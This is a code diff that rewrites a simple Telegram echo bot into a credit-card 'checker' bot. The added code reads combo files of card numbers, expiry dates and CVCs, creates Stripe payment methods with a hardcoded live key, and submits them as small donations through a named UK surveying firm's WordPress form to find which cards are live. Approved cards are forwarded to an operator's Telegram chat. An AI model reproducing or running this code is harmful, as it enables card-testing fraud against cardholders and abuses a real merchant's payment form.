@@ -1,29 +1,220 @@
-import telebot
 import os
+import logging
+from telegram import Update
+from telegram.ext import Application, CommandHandler, MessageHandler, CallbackContext, filters
 from flask import Flask, request
+import requests
+import time
+import pyfiglet
 
-TOKEN = os.environ.get("BOT_TOKEN")
-bot = telebot.TeleBot(TOKEN)
+# Enable logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', 
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# Color codes
+Z = '\033[1;31m'
+F = '\033[2;32m'
+C = '\033[2;35m'
+
+# Display logo
+logo = pyfiglet.figlet_format('KMZ BOT')
+print(Z + logo)
+
+# Flask app for webhook handling
 app = Flask(__name__)
 
-WEBHOOK_URL = f"https://telebot-ep9a.onrender.com/{TOKEN}"
-  # Change this later
+# Telegram Bot Token
+TOKEN = os.getenv('BOT_TOKEN')  # Should be stored in the environment variable
+bot_url = f"https://api.telegram.org/bot{TOKEN}"
 
-@bot.message_handler(func=lambda message: True)
-def handle_message(message):
-    bot.reply_to(message, f"You said: {message.text}")
+# Telegram bot application
+application = Application.builder().token(TOKEN).build()
 
+# Route to handle webhook requests
 @app.route(f'/{TOKEN}', methods=['POST'])
 def webhook():
-    update = telebot.types.Update.de_json(request.data.decode('utf-8'))
-    bot.process_new_updates([update])
-    return '', 200
+    """Handle incoming updates from Telegram"""
+    update = Update.de_json(request.json, application.bot)
+    application.process_update(update)
+    return '', 200  # Return 200 OK response to Telegram
 
 @app.route('/')
 def index():
-    return 'Bot is running!'
+    """Basic health check endpoint"""
+    return 'KMZ Bot is running!'
+
+# Command and message handlers
+async def start(update: Update, context: CallbackContext) -> None:
+    """Send welcome message"""
+    user = update.effective_user
+    await update.message.reply_text(
+        f'Hi {user.first_name}! Welcome to KMZ Checker Bot\n\n'
+        'Send me a combo file (text file with CC details) to start checking.'
+    )
+
+async def help_command(update: Update, context: CallbackContext) -> None:
+    """Send help message"""
+    await update.message.reply_text(
+        'Help: Send me a combo file (text file) with CC details in format:\n'
+        'cardnumber|mm|yy|cvc'
+    )
+
+async def handle_document(update: Update, context: CallbackContext) -> None:
+    """Handle received combo file"""
+    file = await update.message.document.get_file()
+    await file.download_to_drive('combo.txt')
+    
+    if 'token' not in context.user_data:
+        await update.message.reply_text('Please send your Telegram bot token:')
+        return
+    if 'chat_id' not in context.user_data:
+        await update.message.reply_text('Please send your Telegram chat ID:')
+        return
+    
+    await process_combo(update, context, 'combo.txt')
+
+async def process_combo(update: Update, context: CallbackContext, combo_file: str):
+    """Process the combo file"""
+    await update.message.reply_text('Starting to check cards...')
+    
+    token = context.user_data['token']
+    chat_id = context.user_data['chat_id']
+    start_num = 0
+    
+    with open(combo_file, 'r') as file:
+        for P in file.readlines():
+            start_num += 1
+            try:
+                n, mm, yy, cvc = P.split('|')[:4]
+                yy = yy[-2:]
+                cvc = cvc.strip()
+
+                time.sleep(10)
+                
+                headers = {
+                    'authority': 'api.stripe.com',
+                    'accept': 'application/json',
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'origin': 'https://js.stripe.com',
+                    'referer': 'https://js.stripe.com/',
+                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+                }
+
+                data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_9sEidmFcTHYDfhGn3zZYH1wG00ZmolhPCV'
+
+                r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+                
+                try:
+                    pm = r1.json()['id']
+                except:
+                    er = r1.json()['error']['message']
+                    if 'Your card number is incorrect.' in r1.text:
+                        await update.message.reply_text(f'[ {start_num} ] {P} ➠➠ Incorrect Number ❌')
+                        continue
+                    else:
+                        await update.message.reply_text(er)
+                        continue
+                
+                time.sleep(10)
+
+                cookies = {
+                    '__stripe_mid': '230ce009-a549-426f-85bc-03755d77fc9c4c1b8c',
+                    '__stripe_sid': '7ce5943d-649f-4c39-9295-6087751937fcc63f98',
+                }
+
+                headers = {
+                    'authority': 'fpsurveying.co.uk',
+                    'accept': '*/*',
+                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'origin': 'https://fpsurveying.co.uk',
+                    'referer': 'https://fpsurveying.co.uk/book/homebuyer-instruction-august-old/',
+                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+                    'x-requested-with': 'XMLHttpRequest',
+                }
+
+                params = {'t': '1744046259435'}
+
+                data = {
+                    'data': f'payment_method=stripe&custom_donation_amount=3.00&__stripe_payment_method_id={pm}',
+                    'action': 'fluentform_submit',
+                    'form_id': '44'
+                }
+
+                r2 = requests.post(
+                    'https://fpsurveying.co.uk/wp-admin/admin-ajax.php',
+                    params=params,
+                    cookies=cookies,
+                    headers=headers,
+                    data=data,
+                )
+                
+                if "Thank you so much for your donation" in r2.text:
+                    msg = f'''✘ Succeeded ✅
+✘ Approved ✅
+✘ CC ➠ {P}
+✘ Result ➠ Approved
+✘ Gateway ➠ Stripe Auth
+━━━━━━━━━━━━━━━━━  
+✘ By ➠ KMZ BOT'''
+                    await update.message.reply_text(msg)
+                    await send_telegram_alert(token, chat_id, msg)
+                
+                elif "insufficient funds" in r2.text:
+                    msg = f'''✘ Approved ✅
+✘ CC ➠ {P}
+✘ Result ➠ Approved ✅ (Low balance)
+━━━━━━━━━━━━━━━━━  
+✘ By ➠ KMZ BOT'''
+                    await update.message.reply_text(msg)
+                    await send_telegram_alert(token, chat_id, msg)
+
+                elif "security code is incorrect" in r2.text or "ZIP INCORRECT" in r2.text:
+                    msg = f'''✘ Approved ✅
+✘ CC ➠ {P}
+✘ Result ➠ Approved ✅ (CCN Live)
+━━━━━━━━━━━━━━━━━  
+✘ By ➠ KMZ BOT'''
+                    await update.message.reply_text(msg)
+                    await send_telegram_alert(token, chat_id, msg)
+
+                else:
+                    await update.message.reply_text(f'[ {start_num} ] {P} ➠➠ Declined ❌')
+
+            except Exception as e:
+                await update.message.reply_text(f'Error processing line {start_num}: {str(e)}')
+                continue
+
+async def send_telegram_alert(token: str, chat_id: str, message: str):
+    """Send alert to Telegram"""
+    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}"
+    requests.post(url)
+
+async def handle_text(update: Update, context: CallbackContext) -> None:
+    """Handle text messages"""
+    text = update.message.text
+    
+    if 'token' not in context.user_data:
+        context.user_data['token'] = text
+        await update.message.reply_text('Token saved. Now please send your chat ID:')
+        return
+    
+    if 'chat_id' not in context.user_data:
+        context.user_data['chat_id'] = text
+        await update.message.reply_text('Chat ID saved. Now please send your combo file (as document):')
+
+# Setup webhook
+def set_webhook():
+    """Set up the webhook URL"""
+    webhook_url = f'https://<your-cloud-url>/{TOKEN}'  # Replace <your-cloud-url> with the correct URL
+    response = requests.get(f'https://api.telegram.org/bot{TOKEN}/setWebhook?url={webhook_url}')
+    if response.status_code == 200:
+        print("Webhook set successfully!")
+    else:
+        print("Failed to set webhook")
 
 if __name__ == '__main__':
-    bot.remove_webhook()
-    bot.set_webhook(url=WEBHOOK_URL)
+    set_webhook()
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
